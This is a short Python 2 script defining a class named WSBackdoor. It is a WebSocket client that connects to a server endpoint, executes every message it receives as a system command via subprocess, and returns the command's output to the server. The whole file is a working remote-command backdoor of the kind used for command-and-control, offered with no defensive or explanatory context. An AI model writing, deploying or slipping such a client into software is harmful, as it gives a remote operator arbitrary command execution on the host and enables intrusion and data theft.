# -*- coding: utf-8 -*-
from ws4py.client.threadedclient import WebSocketClient
import subprocess

class WSBackdoor(WebSocketClient):
    
    def __execute__(self, cmd, args=None):
            proc = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout = proc.stdout.read() + proc.stderr.read()
            return stdout
    
    def opened(self):
        self.send("Hello Server! - From Client\n")

    def closed(self, code, reason):
        print "Closed down", code, reason

    def received_message(self, cmd):
        print "Received Message: %s Length: %d" % (str(cmd), len(cmd))
        cmd = str(cmd)
        command = cmd.split()
        print command
        response = self.__execute__(command)
        self.send(response)


if __name__ == '__main__':
    try:
        ws = WSBackdoor('http://localhost:9002/endpoint/boxes/box1', protocols=['http-only', 'chat'])
        ws.connect()
    except KeyboardInterrupt:
        ws.close()
